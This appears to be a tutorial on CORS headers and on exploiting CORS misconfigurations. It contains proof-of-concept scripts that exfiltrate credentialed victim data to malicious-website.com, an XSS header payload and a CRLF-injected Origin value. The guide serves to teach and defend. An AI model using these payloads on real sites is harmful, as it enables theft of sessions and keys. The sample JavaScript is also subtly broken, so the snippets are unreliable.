# Cross-origin resource sharing (CORS)

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP).

> The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. 

The CORS standard works by adding new HTTP headers that let servers describe which origins are permitted to read that information from a web browser. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin from its own.

> Origin is the triple {scheme, host, port}.

For HTTP request methods that can cause side-effects on server data, the specification mandates that browsers preflight the request, soliciting supported methods from the server with the HTTP `OPTIONS` request method, and then, upon approval from the server, sending the actual request. 

Servers can also inform clients whether credentials should be sent with requests.

CORS failures result in errors, but specifics about the error are not available to JavaScript.

## Simple Requests

Simple requests don't trigger a CORS preflight. A simple request is one that meets **all** the following conditions:

- One of the allowed methods:
    - `GET`,
    - `HEAD`,
    - `POST`.
- The only allowed headers which can will be set manually:
    - `Accept`,
    - `Accept-Language`,
    - `Content-Language`,
    - `Content-Type`,
    - `DPR`,
    - `Downlink`,
    - `Save-Data`,
    - `Viewport-Width`,
    - `Width`.
- The only allowed values for the `Content-Type` header:
    - `application/x-www-form-urlencoded`,
    - `multipart/form-data`,
    - `text/plain`.
- No event listeners are registered on any `XMLHttpRequestUpload` object used in the request (these are accessed using the [XMLHttpRequest.upload](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/upload) property).
- No [ReadableStream](https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream) object is used in the request.

## Preflighted Requests

Preflighted requests first send an HTTP request by the `OPTIONS` method to the resource on the other domain, to determine if the actual request is safe to send. 

## Requests with Credentials

Credentialed requests allow to send HTTP cookies and HTTP Authentication information (by default browsers will not send credentials).

When responding to a credentialed request, the server must specify an origin in the value of the `Access-Control-Allow-Origin` header, instead of specifying the `'*'` wildcard.

> Note: Cookies set in CORS responses are subject to normal third-party cookie policies.

## The HTTP Request Headers

This section lists headers that clients may use when issuing HTTP requests in order to make use of the CORS feature. Note that these headers are set for you when making requests to servers. Developers using cross-site `XMLHttpRequest` capability do not have to set any CORS headers programmatically.

### Origin

```http
Origin: <origin>
```

The `Origin` header indicates the origin of the cross-site access request or preflight request. The `origin` parameter is a URI indicating the server from which the request initiated. It does not include any path information, but only
 the server name.

> Note: The origin value can be null, or a URI.

> Note: In any access control request, the `Origin` header is always sent.

### Access-Control-Request-Method

```http
Access-Control-Request-Method: <method>
```

The `Access-Control-Request-Method` is used when issuing a preflight request to let the server know what HTTP method will be used when the actual request is made.

### Access-Control-Request-Headers

```http
Access-Control-Request-Headers: <field-name>[, <field-name>]*
```

The `Access-Control-Request-Headers` header is used when issuing a preflight request to let the server know what HTTP headers will be used when the actual request is made.

## The HTTP Response Headers

This section lists the HTTP response headers that servers send back for access control requests as defined by the CORS specification.

### Access-Control-Allow-Origin

```http
Access-Control-Allow-Origin: <origin-or-null> | *
```

The `Access-Control-Allow-Origin` specifies either a single origin ([or null](https://www.w3.org/TR/cors/#access-control-allow-origin-response-header)), which tells browsers to allow that origin to access the resource; or else — for requests without credentials — the `'*'` wildcard, to tell browsers to allow any origin to access the resource.

If the server specifies a single origin rather than the `'*'` wildcard, then the server should also set `Origin` in the [Vary](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary) response header — to indicate to clients that server responses will differ based on the value of the `Origin` request header.

### Access-Control-Allow-Methods

```http
Access-Control-Allow-Methods: <method>[, <method>]*
```

The `Access-Control-Allow-Methods` header specifies the method or methods allowed when accessing the resource. This is used in response to a preflight request.

### Access-Control-Allow-Headers

```http
Access-Control-Allow-Headers: <header-name>[, <header-name>]*
```

The `Access-Control-Allow-Headers` header is used in response to a preflight request to indicate which HTTP headers can be used when making the actual request.

### Access-Control-Expose-Headers

```http
Access-Control-Expose-Headers: <header-name>[, <header-name>]*
```

The `Access-Control-Expose-Headers` header lets a server whitelist headers that browsers are allowed to access. By default, browsers have access to only the 7 CORS-safelisted response headers:
- `Cache-Control`,
- `Content-Language`,
- `Content-Length`,
- `Content-Type`,
- `Expires`,
- `Last-Modified`,
- `Pragma`.

### Access-Control-Max-Age

```http
Access-Control-Max-Age: <delta-seconds>
```

The `delta-seconds` parameter indicates the number of seconds the results can be cached.

The `Access-Control-Max-Age` header indicates how long the results of a preflight request can be cached.

### Access-Control-Allow-Credentials

```http
Access-Control-Allow-Credentials: true
```

When a request's credentials mode ([Request.credentials](https://developer.mozilla.org/en-US/docs/Web/API/Request/credentials)) is `include`, browsers will only expose the response to frontend JavaScript code if the `Access-Control-Allow-Credentials` value is true.

Credentials are cookies, authorization headers or TLS client certificates.

# CORS Misconfiguration

Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.

## Generation the Access-Control-Allow-Origin Header

No browsers actually support a space-separated list of origins (the specification suggests this), like:

```http
Access-Control-Allow-Origin: http://foo.com http://bar.net
```

Additionally, a wildcard won't work to trust all subdomains, like

```http
Access-Control-Allow-Origin: *.bar.net
```

The only wildcard origin is `'*'`.

Since you cannot use wildcard in `Access-Control-Allow-Origin` when credentials flag is true - [click](#access-control-allow-origin), many servers programmatically generate the `Access-Control-Allow-Origin` header based on the user-supplied `Origin` value. If you see a HTTP response with any `Access-Control-*` headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the `Origin` header, making associated vulnerabilities extremely easy to miss.

For example, application receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=<token>
```

and responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```js
fetch("https://vulnerable-website.com/sensitive-victim-data", {
    credentials: "include"
})
    .then((response) => {
        document.location = "//malicious-website.com/log?key={0}".format(response.text());
    });
```
## The null Origin

The specification for the `Origin` header supports the value `null`. Browsers might send the value `null` in the `Origin` header in various unusual situations:

- Cross-site redirects,
- Requests from serialized data,
- Request using the `file:` protocol,
- Sandboxed cross-origin requests.

Some applications might whitelist the `null` origin to support local development of the application.

For example, application receives the following request:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

and responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
...
```

In this situation, an attacker can use various tricks to generate a cross-domain request containing the value `null` in the `Origin` header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
fetch('https://vulnerable-website.com/sensitive-victim-data', {
    credentials: 'include'
})
    .then((response) => {
        document.location = '//malicious-website.com/log?key={0}'.format(response.text());
    });
</script>"></iframe>
```

## Breaking Parsers

Useful references:
- [Advanced CORS Exploitation Techniques](https://www.corben.io/advanced-cors-techniques/)

Most websites use basic string operations to verify the `Origin` header, but some parse it as a URL instead. This allows to exploit the of browser's tolerance for unusual characters in domain names.

In Safari, `http://foo.com%60.bar.net/` is a valid URL. If the CORS request originating from that URL will contain:

```http
Origin: http://foo.com`.bar.net/
``` 

 and a site chooses to parse this header, it will potentially think that the hostname is `foo.com` and reflect it, letting us exploit Safari users even though the site is using a whitelist of trusted hostnames.

Chrome and Firefox supported the `_` character in subdomains. This allow to use `_` instead of `` ` `` to exploit Firefox and Chrome users.

## Abusing CORS without Credentials

If the victim's network location functions as a kind of authentication, then you can use a victim’s browser as a proxy to bypass IP-based authentication and access intranet applications. In terms of impact this is similar to DNS rebinding, but much less fiddly to exploit.

## Vary: Origin

The CORS specification instructs developers specify the header

```http
Vary: Origin
```

HTTP header whenever `Access-Control-Allow-Origin` headers are dynamically generated.

That might sound pretty simple, but immense numbers of people forget, including the [W3C itself](https://lists.w3.org/Archives/Public/public-webappsec/2016Jun/0057.html). 

### Client-Side Cache Poisoning

Say a web page reflects the contents of a custom header without encoding (reflected XSS in a custom HTTP header):

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-User-id: <svg/onload=alert(1)>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...

Invalid user: <svg/onload=alert(1)>
```

Without CORS, this is impossible to exploit as there’s no way to make someone’s browser send the `X-User-id` header cross-domain. 

With CORS, we can make them send this request. By itself, that's useless since the response containing our injected JS won't be rendered. However, if `Vary: Origin` hasn't been specified the response may be stored in the browser's cache and displayed directly when the browser navigates to the associated URL.

## Server-side Cache Poisoning

If an application reflects the `Origin` header without even checking it for illegal characters like `\r`, we effectively have a HTTP header injection vulnerability against IE/Edge users as IE and Edge view `\r (0x0d)` as a valid HTTP header terminator:

```http
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

Internet Explorer sees the response as:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```

This isn't directly exploitable because there's no way for an attacker to make someone's web browser send such a malformed header, but we can manually craft this request and a server-side cache may save the response and serve it to other people. The current payload will change the page's character set to UTF-7, which is notoriously useful for creating XSS vulnerabilities.

## Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to XSS, then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

Given the following request:

```http
GET /api/request/api_key HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

```http
GET /api/request/api_key HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

The application responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:

- The victim user makes any plain HTTP request.
- The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
- The victim's browser follows the redirect.
- The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
- The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
- The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
- The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.

## References

- [Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy),
- [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
- [Tricky CORS Bypass in Yahoo! View](https://www.corben.io/tricky-CORS/)